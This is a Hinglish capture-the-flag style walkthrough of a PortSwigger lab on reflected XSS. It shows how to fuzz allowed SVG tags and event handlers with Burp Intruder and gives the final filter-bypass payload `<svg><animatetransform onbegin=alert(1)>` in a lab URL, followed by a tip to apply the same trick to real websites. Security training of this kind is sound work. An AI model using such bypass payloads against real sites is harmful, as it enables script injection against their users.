# Reflected XSS with some SVG markup allowed

Reflected XSS attack karna hai lekin normal tags (```<script>, <img>``` etc.) block ho rahe hain. Sirf kuch SVG (Scalable Vector Graphics) tags jaise ```<svg>, <title>, <image>```, ```<animatetransform>``` aur kuch SVG event handlers jaise onbegin allow hain.

---

### ✅ Goal:

Browser mein alert(1) chalana hai using SVG-based XSS payload.

---

🔧 Steps – A to Z:

Step 1: Normal payload test karo

```<img src=1 onerror=alert(1)>```

Result: Block ho gaya

---

Step 2: Burp Intruder ka use karo to find allowed tags

1. Lab open karo Burp browser mein

2. Search box mein kuch bhi likho, jaise abc, aur request ko Burp Intruder mein send karo.

3. Intruder mein search=abc ko replace karo:

```search=<§§>```

4. XSS Cheat Sheet se tags copy karo: 👉
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

5. Intruder → Payloads tab → Paste tags → Start attack

Result dekho: Sab 400 response dete hain except:

```<svg>, <title>, <image>, <animatetransform>```

---

Step 3: Ab attributes test karo

1. Payload banayo:

```<svg><animatetransform%20§§=1>```

Yahan ```%20``` = space hai

2. Ab Intruder mein event handlers test karo from XSS Cheat Sheet:

onload, onerror, onmouseover, etc.

Paste karo aur Start Attack

Result: Sirf onbegin pe response 200 aya

---

✅ Final Payload:

```<svg><animatetransform onbegin=alert(1)>```

But URL encode karo (jaise browser ke liye):

```%22%3E<svg><animatetransform%20onbegin=alert(1)>```

So, final URL:

```https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E<svg><animatetransform%20onbegin=alert(1)>```

Open karo → alert() chalega → Lab Solved! ✅

---

📌 Real-world Penetration Testing Tip:

Agar koi website <script> block kar rahi hai, SVG tags aur uncommon attributes/events ka use karo. Bypasses mil sakte hain. Burp Intruder se brute-force style mein find kar sakte ho kya allowed hai.

